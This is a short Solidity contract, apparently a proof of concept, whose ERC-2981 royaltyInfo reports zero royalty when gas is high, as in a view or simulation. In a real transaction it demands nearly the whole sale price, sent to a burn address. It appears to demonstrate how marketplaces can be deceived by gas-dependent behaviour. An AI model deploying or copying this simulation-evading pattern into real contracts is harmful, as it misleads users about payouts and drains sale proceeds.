/**
 *Submitted for verification at Etherscan.io on 2022-02-14
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

contract AdversarialRoyalties { 
    bytes4 private constant _INTERFACE_ID_ERC2981 = 0x2a55205a;

    event Log(address from, uint _gasleft);

    function supportsInterface(bytes4 interfaceID) external pure returns (bool) {
        return interfaceID == _INTERFACE_ID_ERC2981;
    }

    function echo() public view returns (address,uint256) {
        return (msg.sender, gasleft());
    }

    function royaltyInfo(
        uint256 /* _tokenId */,
        uint256 _salePrice
    ) public view returns (
        address receiver,
        uint256 royaltyAmount
    ) {
        receiver = address(0xdEaD);
        royaltyAmount = gasleft() > 15_000_000 
            ? 0               // looks like we're in getRoyaltyView(), so play nice
            : _salePrice - 1; // during an actual transaction, be nasty
    }

    function getRoyaltyView(uint amount) public view returns (uint payout) {
        (, payout) = royaltyInfo(42, amount);
    }

    function getRoyaltyUsedInPayout(uint amount) public returns (uint payout) {
        (, payout) = royaltyInfo(42, amount);
    }
}